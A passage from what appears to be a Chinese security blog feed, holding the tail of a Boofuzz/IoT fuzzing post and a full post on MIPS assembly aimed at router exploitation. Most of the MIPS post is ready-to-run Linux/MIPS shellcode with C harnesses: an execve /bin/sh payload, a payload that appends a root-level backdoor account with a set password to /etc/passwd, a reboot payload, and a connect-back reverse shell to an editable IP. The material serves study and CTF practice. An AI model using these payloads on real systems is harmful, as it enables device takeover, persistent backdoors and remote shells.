href="#波特率" class="headerlink" title="波特率"></a>波特率</h3><p><img alt="image-20200720143201264" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720143201264.png" class="lozad"></p><p><img alt="image-20200724141742030" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724141742030.png" class="lozad"></p><h2 id="BOOFUZZ流程"><a href="#BOOFUZZ流程" class="headerlink" title="BOOFUZZ流程"></a>BOOFUZZ流程</h2><p><img alt="image-20200721101153708" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200721101153708.png" class="lozad"></p><p><img alt="image-20200720161547905" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720161547905.png" class="lozad"></p><p>0x01 Boofuzz虚拟环境创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python3-pip python3-venv build-essential</span><br><span class="line">$ mkdir boofuzz &amp;&amp; cd boofuzz</span><br><span class="line">$ python3 -m venv env</span><br><span class="line">$ source env/bin/activate</span><br></pre></td></tr></table></figure><p>0x02 Boofuzz安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(env) $ pip install boofuzz</span><br></pre></td></tr></table></figure><p>0x03 Boofuzz框架主要层</p><ul><li>数据生成：根据协议格式利用原语来构造请求</li><li>会话管理/驱动：将请求以图的形式链接起来形成会话，同时管理待测目标、代理、请求，还提供一个web界面用于监视和控制</li><li>代理：与目标进行交互以实现日志记录、对网络流量进行监控等<br>通常，代理是运行在目标设备上。但是，对于IoT设备而言，大部分情况下都无法在目标设备上运行代理程序。</li><li>实用工具：独立的命令行工具，完成一些其他的功能</li></ul><p>0x04 Boofuzz测试的主要步骤</p><ul><li>根据网络数据包构造请求</li><li>设置会话信息(包括测试目标的ip地址和端口等)，然后按照请求的先后顺序将其链接起来</li><li>添加对目标设备的监控和设备重启机制等</li><li>开始fuzz</li></ul><p>0x05 Boofuzz常用语法</p><ul><li><p>session():建立会话模块</p></li><li><p>s_initialize:初始化模块</p></li><li><p>call_back:回调函数</p><p>根据每个节点进行操作，定义回调函数以实现根据相应结果执行制</p></li></ul><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>后台 127.0.0.1:26000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boo open ./test.db</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会
      
    
    </summary>
    
      <category term="iot" scheme="https://nocbtm.github.io/categories/iot/"/>
    
    
      <category term="iot" scheme="https://nocbtm.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>mips 汇编语言</title>
    <link href="https://nocbtm.github.io/2020/06/06/mips-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    <id>https://nocbtm.github.io/2020/06/06/mips-汇编语言/</id>
    <published>2020-06-06T09:47:28.000Z</published>
    <updated>2020-11-27T06:04:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要着手去做一些路由器的漏洞复现，了解到路由器大多都是<code>mips</code>架构的，像<code>TP-Link</code>的路由器；</p><p>还有<code>arm</code>架构的，像华为，小米的路由器。</p><p>根据之前学习<code>X86</code>下的汇编和做过<code>arm-pwn</code>的经验，其实很容易掌握<code>mips</code>汇编，更容易抓住重点。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>1.<code>MIPS</code>使用定长指令，所有指令都是32位长的<br>2.1字节=8位，半字长=2个字节（32位），1字长=4个字节<br>3.一个字符空间=1个字节<br>4.一个整形=一个字长=4个字节<br>5.单个字符用单引号<br>6.字符串用双引号</p><h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>一共有32个寄存器一般用助记符表示</p><ul><li>MIPS下一共有32个通用寄存器</li><li>在汇编中，寄存器标志以$开头</li><li>寄存器表示可以有两种方式：<br>1.直接使用该寄存器对应的编号，例如：从$0到$31<br>2.使用对应的寄存器名称，例如t1,t1,sp，详见下文</li><li>对于以上两者，不存在直接寻址，必须通过<code>mfhi(“move from hi”)</code>和<code>mflo(“move from lo”)</code>分别来进行访问对应的内容。</li><li>栈的走向是从高地址向低地址</li></ul><p><img alt="" data-src="https://nocbtm.github.io/imgs/mips-asm-1.png" class="lozad"></p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><p>指令的话没必要全部都看反正看了也记不住，留一个基本的指令集来查询吧 <a href="https://blog.csdn.net/yixilee/article/details/4316617" target="_blank" rel="noopener">MIPS指令集</a></p><p>值得注意的是 <code>MIPS</code>有三种指令格式，而且所有的指令都是32位长，这点跟<code>X86</code>的很不一样。</p><p>通过写 <code>shellcode</code>可以更好的掌握汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sh=<span class="string">'''</span></span><br><span class="line">li $v0,<span class="number">0x6e69622f</span></span><br><span class="line">sw $v0,<span class="number">0</span>($sp)</span><br><span class="line">li $v0,<span class="number">0x0068732f</span></span><br><span class="line">sw $v0,<span class="number">4</span>($sp)</span><br><span class="line">addiu $a0,$sp,<span class="number">0</span></span><br><span class="line">li $v0,<span class="number">4011</span></span><br><span class="line">li $a1,<span class="number">0</span></span><br><span class="line">li $a2,<span class="number">0</span></span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Title:  Linux/MIPS - execve /bin/sh - 48 bytes</span></span><br><span class="line"><span class="comment">   Date:   2011-11-24</span></span><br><span class="line"><span class="comment">   Author: rigan - imrigan [at] gmail.com</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">        .text</span></span><br><span class="line"><span class="comment">        .global __start</span></span><br><span class="line"><span class="comment">__start:</span></span><br><span class="line"><span class="comment">        slti $a2, $zero, -1</span></span><br><span class="line"><span class="comment">        li $t7, 0x2f2f6269</span></span><br><span class="line"><span class="comment">        sw $t7, -12($sp)</span></span><br><span class="line"><span class="comment">        li $t6, 0x6e2f7368</span></span><br><span class="line"><span class="comment">        sw $t6, -8($sp)</span></span><br><span class="line"><span class="comment">        sw $zero, -4($sp)</span></span><br><span class="line"><span class="comment">        la $a0, -12($sp)</span></span><br><span class="line"><span class="comment">        slti $a1, $zero, -1</span></span><br><span class="line"><span class="comment">        li $v0, 4011</span></span><br><span class="line"><span class="comment">        syscall 0x40404</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> sc[] = &#123;</span><br><span class="line">        <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">/* slti    a2,zero,-1   */</span></span><br><span class="line">        <span class="string">"\x3c\x0f\x2f\x2f"</span>        <span class="comment">/* lui     t7,0x2f2f    */</span></span><br><span class="line">        <span class="string">"\x35\xef\x62\x69"</span>        <span class="comment">/* ori     t7,t7,0x6269 */</span></span><br><span class="line">        <span class="string">"\xaf\xaf\xff\xf4"</span>        <span class="comment">/* sw      t7,-12(sp)   */</span></span><br><span class="line">        <span class="string">"\x3c\x0e\x6e\x2f"</span>        <span class="comment">/* lui     t6,0x6e2f    */</span></span><br><span class="line">        <span class="string">"\x35\xce\x73\x68"</span>        <span class="comment">/* ori     t6,t6,0x7368 */</span></span><br><span class="line">        <span class="string">"\xaf\xae\xff\xf8"</span>        <span class="comment">/* sw      t6,-8(sp)    */</span></span><br><span class="line">        <span class="string">"\xaf\xa0\xff\xfc"</span>        <span class="comment">/* sw      zero,-4(sp)  */</span></span><br><span class="line">        <span class="string">"\x27\xa4\xff\xf4"</span>        <span class="comment">/* addiu   a0,sp,-12    */</span></span><br><span class="line">        <span class="string">"\x28\x05\xff\xff"</span>        <span class="comment">/* slti    a1,zero,-1   */</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xab"</span>        <span class="comment">/* li      v0,4011      */</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">/* syscall 0x40404      */</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="built_in">strlen</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Title:  Linux/MIPS - add user(UID 0) with password - 164 bytes</span></span><br><span class="line"><span class="comment"> * Date:   2011-11-24</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [at] gmail.com</span></span><br><span class="line"><span class="comment"> * Note:</span></span><br><span class="line"><span class="comment"> *         Username - rOOt</span></span><br><span class="line"><span class="comment"> *         Password - pwn3d</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> sc[] =</span><br><span class="line">        <span class="string">"\x24\x09\x73\x50"</span>       <span class="comment">//  li      t1,29520</span></span><br><span class="line">        <span class="string">"\x05\x30\xff\xff"</span>       <span class="comment">//  bltzal  t1,400094 &lt;L&gt;</span></span><br><span class="line">        <span class="string">"\x24\x09\x73\x50"</span>       <span class="comment">//  li      t1,29520 (nop)</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND); */</span></span><br><span class="line">        <span class="string">"\x3c\x0f\x30\x2f"</span>       <span class="comment">//  lui     t7,0x302f</span></span><br><span class="line">        <span class="string">"\x35\xef\x65\x74"</span>       <span class="comment">//  ori     t7,t7,0x6574</span></span><br><span class="line">        <span class="string">"\x3c\x0e\x63\x2f"</span>       <span class="comment">//  lui     t6,0x632f   </span></span><br><span class="line">        <span class="string">"\x35\xce\x70\x61"</span>       <span class="comment">//  ori     t6,t6,0x7061</span></span><br><span class="line">        <span class="string">"\x3c\x0d\x73\x73"</span>       <span class="comment">//  lui     t5,0x7373</span></span><br><span class="line">        <span class="string">"\x35\xad\x77\x64"</span>       <span class="comment">//  ori     t5,t5,0x7764</span></span><br><span class="line">        <span class="string">"\xaf\xaf\xff\xf3"</span>       <span class="comment">//  sw      t7,-13(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xae\xff\xf7"</span>       <span class="comment">//  sw      t6,-9(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xad\xff\xfb"</span>       <span class="comment">//  sw      t5,-5(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xa0\xff\xff"</span>       <span class="comment">//  sw      zero,-1(sp)</span></span><br><span class="line">        <span class="string">"\x27\xa4\xff\xf4"</span>       <span class="comment">//  addiu   a0,sp,-12</span></span><br><span class="line">        <span class="string">"\x24\x05\x01\x6d"</span>       <span class="comment">//  li      a1,365</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa5"</span>       <span class="comment">//  li      v0,4005</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">        <span class="string">"\xaf\xa2\xff\xfc"</span>       <span class="comment">//  sw      v0,-4(sp)</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* write(fd, "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n", 45); */</span></span><br><span class="line">        <span class="string">"\x8f\xa4\xff\xfc"</span>       <span class="comment">//  lw      a0,-4(sp)</span></span><br><span class="line">        <span class="string">"\x23\xe5\x10\x0c"</span>       <span class="comment">//  addi    a1,ra,4108</span></span><br><span class="line">        <span class="string">"\x20\xa5\xf0\x60"</span>       <span class="comment">//  addi    a1,a1,-4000</span></span><br><span class="line">        <span class="string">"\x24\x09\xff\xd3"</span>       <span class="comment">//  li      t1,-45</span></span><br><span class="line">        <span class="string">"\x01\x20\x30\x27"</span>       <span class="comment">//  nor     a2,t1,zero</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa4"</span>       <span class="comment">//  li      v0,4004</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">/* close(fd); */</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa6"</span>       <span class="comment">//  li      v0,4006</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* exit(0);  */</span></span><br><span class="line">        <span class="string">"\x28\x04\xff\xff"</span>        <span class="comment">//  slti    a0,zero,-1</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa1"</span>        <span class="comment">//  li      v0,4001</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">//  syscall 0x40404</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">/*  "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n" */</span></span><br><span class="line">        <span class="string">"\x72\x4f\x4f\x74"</span>       </span><br><span class="line">        <span class="string">"\x3a\x58\x4a\x31"</span>       </span><br><span class="line">        <span class="string">"\x47\x56\x2e\x6e"</span>       </span><br><span class="line">        <span class="string">"\x79\x46\x46\x4d"</span>       </span><br><span class="line">        <span class="string">"\x6f\x49\x3a\x30"</span>       </span><br><span class="line">        <span class="string">"\x3a\x30\x3a\x72"</span>       </span><br><span class="line">        <span class="string">"\x6f\x6f\x74\x3a"</span>       </span><br><span class="line">        <span class="string">"\x2f\x72\x6f\x6f"</span>      </span><br><span class="line">        <span class="string">"\x74\x3a\x2f\x62"</span>      </span><br><span class="line">        <span class="string">"\x69\x6e\x2f\x62"</span>       </span><br><span class="line">        <span class="string">"\x61\x73\x68\x0a"</span>;       </span><br><span class="line">       </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="built_in">strlen</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Linux/MIPS - reboot() - 32 bytes.</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [sobachka] gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] =          </span><br><span class="line">         <span class="string">"\x3c\x06\x43\x21"</span>       <span class="comment">// lui     a2,0x4321</span></span><br><span class="line">         <span class="string">"\x34\xc6\xfe\xdc"</span>       <span class="comment">// ori     a2,a2,0xfedc</span></span><br><span class="line">         <span class="string">"\x3c\x05\x28\x12"</span>       <span class="comment">// lui     a1,0x2812</span></span><br><span class="line">         <span class="string">"\x34\xa5\x19\x69"</span>       <span class="comment">// ori     a1,a1,0x1969</span></span><br><span class="line">         <span class="string">"\x3c\x04\xfe\xe1"</span>       <span class="comment">// lui     a0,0xfee1</span></span><br><span class="line">         <span class="string">"\x34\x84\xde\xad"</span>       <span class="comment">// ori     a0,a0,0xdead</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xf8"</span>       <span class="comment">// li      v0,4088</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>;      <span class="comment">// syscall 0x40404 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="keyword">sizeof</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Linux/MIPS - connect back shellcode (port 0x7a69) - 168 bytes.</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [sobachka] gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] =</span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3</span></span><br><span class="line">         <span class="string">"\x01\xe0\x20\x27"</span>        <span class="comment">// nor     a0,t7,zero</span></span><br><span class="line">         <span class="string">"\x01\xe0\x28\x27"</span>        <span class="comment">// nor     a1,t7,zero</span></span><br><span class="line">         <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">// slti    a2,zero,-1</span></span><br><span class="line">         <span class="string">"\x24\x02\x10\x57"</span>        <span class="comment">// li      v0,4183 ( sys_socket )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\xaf\xa2\xff\xff"</span>        <span class="comment">// sw      v0,-1(sp)</span></span><br><span class="line">         <span class="string">"\x8f\xa4\xff\xff"</span>        <span class="comment">// lw      a0,-1(sp)</span></span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3 ( sa_family = AF_INET )</span></span><br><span class="line">         <span class="string">"\x01\xe0\x78\x27"</span>        <span class="comment">// nor     t7,t7,zero</span></span><br><span class="line">         <span class="string">"\xaf\xaf\xff\xe0"</span>        <span class="comment">// sw      t7,-32(sp) </span></span><br><span class="line">         <span class="string">"\x3c\x0e\x7a\x69"</span>        <span class="comment">// lui     t6,0x7a69 ( sin_port = 0x7a69 )</span></span><br><span class="line">         <span class="string">"\x35\xce\x7a\x69"</span>        <span class="comment">// ori     t6,t6,0x7a69</span></span><br><span class="line">         <span class="string">"\xaf\xae\xff\xe4"</span>        <span class="comment">// sw      t6,-28(sp)</span></span><br><span class="line">         </span><br><span class="line">      <span class="comment">/* ====================  You can change ip here ;) ====================== */</span></span><br><span class="line">         <span class="string">"\x3c\x0d\xc0\xa8"</span>        <span class="comment">// lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ... </span></span><br><span class="line">         <span class="string">"\x35\xad\x01\x64"</span>        <span class="comment">// ori     t5,t5,0x164           ...0164 )</span></span><br><span class="line">      <span class="comment">/* ====================================================================== */</span></span><br><span class="line">      </span><br><span class="line">         <span class="string">"\xaf\xad\xff\xe6"</span>        <span class="comment">// sw      t5,-26(sp)</span></span><br><span class="line">         <span class="string">"\x23\xa5\xff\xe2"</span>        <span class="comment">// addi    a1,sp,-30</span></span><br><span class="line">         <span class="string">"\x24\x0c\xff\xef"</span>        <span class="comment">// li      t4,-17 ( addrlen = 16 )     </span></span><br><span class="line">         <span class="string">"\x01\x80\x30\x27"</span>        <span class="comment">// nor     a2,t4,zero </span></span><br><span class="line">         <span class="string">"\x24\x02\x10\x4a"</span>        <span class="comment">// li      v0,4170 ( sys_connect ) </span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3</span></span><br><span class="line">         <span class="string">"\x01\xe0\x28\x27"</span>        <span class="comment">// nor     a1,t7,zero</span></span><br><span class="line">         <span class="string">"\x8f\xa4\xff\xff"</span>        <span class="comment">// lw      a0,-1(sp)</span></span><br><span class="line"><span class="comment">//dup2_loop:</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xdf"</span>        <span class="comment">// li      v0,4063 ( sys_dup2 )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line">         <span class="string">"\x20\xa5\xff\xff"</span>        <span class="comment">// addi    a1,a1,-1</span></span><br><span class="line">         <span class="string">"\x24\x01\xff\xff"</span>        <span class="comment">// li      at,-1</span></span><br><span class="line">         <span class="string">"\x14\xa1\xff\xfb"</span>        <span class="comment">// bne     a1,at, dup2_loop</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">// slti    a2,zero,-1</span></span><br><span class="line">         <span class="string">"\x3c\x0f\x2f\x2f"</span>        <span class="comment">// lui     t7,0x2f2f</span></span><br><span class="line">         <span class="string">"\x35\xef\x62\x69"</span>        <span class="comment">// ori     t7,t7,0x6269</span></span><br><span class="line">         <span class="string">"\xaf\xaf\xff\xf4"</span>        <span class="comment">// sw      t7,-12(sp)</span></span><br><span class="line">         <span class="string">"\x3c\x0e\x6e\x2f"</span>        <span class="comment">// lui     t6,0x6e2f</span></span><br><span class="line">         <span class="string">"\x35\xce\x73\x68"</span>        <span class="comment">// ori     t6,t6,0x7368</span></span><br><span class="line">         <span class="string">"\xaf\xae\xff\xf8"</span>        <span class="comment">// sw      t6,-8(sp)</span></span><br><span class="line">         <span class="string">"\xaf\xa0\xff\xfc"</span>        <span class="comment">// sw      zero,-4(sp)</span></span><br><span class="line">         <span class="string">"\x27\xa4\xff\xf4"</span>        <span class="comment">// addiu   a0,sp,-12</span></span><br><span class="line">         <span class="string">"\x28\x05\xff\xff"</span>        <span class="comment">// slti    a1,zero,-1</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xab"</span>        <span class="comment">// li      v0,4011 ( sys_execve )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>;       <span class="comment">// syscall 0x40404</span></span><br><span class="line">         </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="keyword">sizeof</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reference：</p><p><a href="http://edu.i-soft.com.cn/doc/longxin-2017/02-1MIPS指令与汇编.pdf" target="_blank" rel="noopener">MIPS指令与汇编.pdf</a></p><p><a href="https://blog.csdn.net/u012837895/article/details/79855896" target="_blank" rel="noopener">MIPS汇编快速入门</a></p><p><a href="https://n132.github.io/2020/04/10/mips-Assembly-Language/" target="_blank" rel="noopener">mips_Assembly_Language</a></p><p><a href="https://blog.csdn.net/yixilee/article/details/4316617" target="_blank" rel="noopener">MIPS指令集</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近要着手去做一些路由器的漏洞复现，了解到路由器大多都是&lt;code&gt;mips&lt;/code&gt;架构的，像&lt;code&gt;TP-Link&lt;/code&gt;
      
    
    </summary>
    
      <category term="mips" scheme="https://nocbtm.github.io/categories/mips/"/>
    
    
      <category term="mips" scheme="https://nocbtm.github.io/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF pwn writeup</title>
